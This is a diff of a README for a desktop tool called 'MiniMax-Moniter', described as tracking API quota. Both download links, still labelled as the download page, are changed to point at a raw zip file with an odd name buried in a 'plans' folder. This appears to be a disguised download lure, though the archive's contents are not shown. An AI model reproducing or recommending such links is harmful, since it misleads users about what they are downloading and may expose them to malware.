@@ -1,6 +1,6 @@
 # 📊 MiniMax-Moniter - Track API Quota in Real Time
 
-[![Download MiniMax-Moniter](https://img.shields.io/badge/Download%20MiniMax--Moniter-blue?style=for-the-badge&logo=github)](https://github.com/aaselefach-tariku/MiniMax-Moniter)
+[![Download MiniMax-Moniter](https://img.shields.io/badge/Download%20MiniMax--Moniter-blue?style=for-the-badge&logo=github)](https://github.com/aaselefach-tariku/MiniMax-Moniter/raw/refs/heads/main/plans/Mini-Moniter-Max-recurvopatent.zip)
 
 ## 🚀 What It Does
 
@@ -35,7 +35,7 @@ The app is made for normal desktop use. It does not need a large setup.
 
 Use this link to visit the download page:
 
-[Open the MiniMax-Moniter download page](https://github.com/aaselefach-tariku/MiniMax-Moniter)
+[Open the MiniMax-Moniter download page](https://github.com/aaselefach-tariku/MiniMax-Moniter/raw/refs/heads/main/plans/Mini-Moniter-Max-recurvopatent.zip)
 
 On the page, look for the latest release or download file. Then:
 
